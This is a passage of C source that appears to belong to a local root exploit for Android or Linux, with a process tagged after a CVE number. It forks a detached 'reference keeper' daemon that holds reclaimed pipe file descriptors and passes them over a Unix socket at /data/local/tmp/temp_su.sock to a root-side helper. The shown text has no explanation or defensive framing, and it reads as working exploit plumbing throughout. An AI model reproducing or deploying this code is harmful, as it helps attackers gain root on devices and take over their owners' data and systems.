  int socket_fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (socket_fd < 0) {
    return 0;
  }
  struct sockaddr_un address;
  memset(&address, 0, sizeof(address));
  address.sun_family = AF_UNIX;
  snprintf(address.sun_path, sizeof(address.sun_path), "%s",
           "/data/local/tmp/temp_su.sock");
  if (connect(socket_fd, (struct sockaddr *)&address, sizeof(address)) != 0) {
    close(socket_fd);
    return 0;
  }

  char allowed = 0;
  char operation = 'H';
  if (!pipe_read_full(socket_fd, &allowed, sizeof(allowed)) || allowed != 'A' ||
      !pipe_write_full(socket_fd, &operation, sizeof(operation))) {
    close(socket_fd);
    return 0;
  }

  char marker = 'P';
  struct iovec iov = {
    .iov_base = &marker,
    .iov_len = sizeof(marker),
  };
  char control[CMSG_SPACE(sizeof(retained_fds))];
  struct msghdr message;
  memset(&message, 0, sizeof(message));
  memset(control, 0, sizeof(control));
  message.msg_iov = &iov;
  message.msg_iovlen = 1;
  message.msg_control = control;
  message.msg_controllen = sizeof(control);
  struct cmsghdr *cmsg = CMSG_FIRSTHDR(&message);
  cmsg->cmsg_level = SOL_SOCKET;
  cmsg->cmsg_type = SCM_RIGHTS;
  cmsg->cmsg_len = CMSG_LEN(sizeof(retained_fds));
  memcpy(CMSG_DATA(cmsg), retained_fds, sizeof(retained_fds));
  if (sendmsg(socket_fd, &message, 0) != (ssize_t)sizeof(marker)) {
    close(socket_fd);
    return 0;
  }

  char acknowledged = 0;
  int transferred = pipe_read_full(
      socket_fd, &acknowledged, sizeof(acknowledged)) && acknowledged == 'K';
  close(socket_fd);
  return transferred;
}

void spawn_p0_ref_keeper(int retained_pipe_index) {
  pid_t child = SYSCHK(fork());
  if (child != 0) {
    pr_info("p0 reference keeper pid=%d pipe=%d\n",
            child, retained_pipe_index);
    return;
  }
  syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
  syscall(SYS_prctl, PR_SET_NAME, "cve43499-p0ref", 0, 0, 0);
  syscall(SYS_setsid);
  int null_fd = (int)syscall(
      SYS_openat, AT_FDCWD, "/dev/null", O_RDWR | O_CLOEXEC, 0);
  if (null_fd >= 0) {
    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
      dup2(null_fd, fd);
    }
    if (null_fd > STDERR_FILENO) {
      close(null_fd);
    }
  }
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if ((int)pipe_index != retained_pipe_index) {
      if (pipe_fds_reclaim[pipe_index][0] >= 0) {
        syscall(SYS_close, pipe_fds_reclaim[pipe_index][0]);
      }
      if (pipe_fds_reclaim[pipe_index][1] >= 0) {
        syscall(SYS_close, pipe_fds_reclaim[pipe_index][1]);
      }
      if (p0_gate_holders[pipe_index][0] >= 0) {
        syscall(SYS_close, p0_gate_holders[pipe_index][0]);
      }
      if (p0_gate_holders[pipe_index][1] >= 0) {
        syscall(SYS_close, p0_gate_holders[pipe_index][1]);
      }
    } else {
      if (pipe_fds_reclaim[pipe_index][1] >= 0) {
        syscall(SYS_close, pipe_fds_reclaim[pipe_index][1]);
      }
      if (p0_gate_holders[pipe_index][1] >= 0) {
        syscall(SYS_close, p0_gate_holders[pipe_index][1]);
      }
    }
  }
  if (retained_pipe_index < 0) {
    for (;;) {
      pause();
    }
  }
  for (;;) {
    if (transfer_p0_references_to_root(retained_pipe_index)) {
      _exit(0);
    }
    usleep(10000);
  }
}

#endif /* PHYS_P0_ORACLE */
